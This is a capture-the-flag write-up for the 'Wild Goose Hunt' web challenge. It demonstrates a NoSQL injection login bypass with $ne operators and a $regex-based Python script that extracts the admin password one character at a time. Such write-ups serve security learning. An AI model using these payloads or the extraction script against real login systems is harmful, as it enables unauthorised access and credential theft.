---
layout: load_md
title: The White Circle | Cyber Apocalypse 2021 | Wild Goose Hunt Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2021
parent: cyber_apocalypse_2021
category: web
challenge: Wild Goose Hunt
tags: "web, twh, sqli, nosql, python"
date: 2021-04-24T00:00:00+00:00
last_update: 2021-04-24T00:00:00+00:00
---

<h1 class="heading card-title white-text">Cyber Apocalypse 2021</h1>

## Wild Goose Hunt

> Solved by : thewhiteh4t

* We have a cool login page and source of the web app for this one
* entrypoint.sh contains the following :

```bash
    #!/bin/ash
    
    # Secure entrypoint
    chmod 600 /entrypoint.sh
    mkdir /tmp/mongodb
    mongod --noauth --dbpath /tmp/mongodb/ &
    sleep 2
    mongo heros --eval "db.createCollection('users')"
    mongo heros --eval 'db.users.insert( { username: "admin", password: "CHTB{f4k3_fl4g_f0r_t3st1ng}"} )'
    /usr/bin/supervisord -c /etc/supervisord.conf
```

* we can see that the flag is being stored as the password of admin
* we need to somehow extract the password
* since its mongoDB first assumption was to check for NoSQL injection
* Here is the error message we get in burp for a normal attempt

![](https://i.imgur.com/P2my3g3.png)

* Lets switch to repeater here

![](https://i.imgur.com/miWWAps.png)

* so we are getting a json response and the message is being displayed in the frontend
* next i tried some basic payloads for NoSQL injection

```
username[$ne]=lol&password[$ne]=lol
```

![](https://i.imgur.com/H6Da6q7.png)

* Authentication bypassed! but we dont get any functionality in the frontend so i proceeded with more payloads

```
username=admin&password[$regex]=A*
```

![](https://i.imgur.com/NCoQigL.png)

* This is an interesting payload because we can use a wildcard to check if a particular character is present in the password or not! 
* we know that the flag is the password and flag begins with `CHTB{` so I tried that next

```
username=admin&password[$regex]=CHTB{.*
```

![](https://i.imgur.com/6ya2cBg.png)

* And it works again!
* Now we can bruteforce characters and check for success message to get correct characters
* I created a small python script for it

```python
    #!/usr/bin/env python3
    #################################
    ## Author    : thewhiteh4t ######
    ## Challenge : Wild Goose Hunt ##
    #################################
    import json
    import requests
    ip = '138.68.187.25'
    port = 31370
    url = f'http://{ip}:{port}/api/login'
    flag = 'CHTB{'
    charset = '_01234abcdefghijklmnopqrstuvwxyz'
    loop_iter = 1
    while flag.endswith('}') == False:
        for char in charset:
            if loop_iter == 1:
                payload = flag + char + '.*'
            else:
                payload = flag + '}'
            data = {
                'username': 'admin',
                'password[$regex]': payload
            }
            try:
                rqst = requests.post(url, data=data)
            except Exception as e:
                print(f'[-] Exception : {e}')
                exit()
            if rqst.status_code == 200:
                resp = rqst.text
                json_resp = json.loads(resp)
                status = json_resp['logged']
                if status == 1:
                    if payload.endswith('}') == False:
                        flag = payload.replace('.*', '')
                    else:
                        flag = payload
                        print(f'FLAG : {flag}')
                        exit()
                    print(f'FLAG : {flag}')
                    loop_iter = 0
                    break
            else:
                print(f'[-] Error : {rqst.status_code}')
        loop_iter += 1
```

![](https://i.imgur.com/6L20wKy.png)
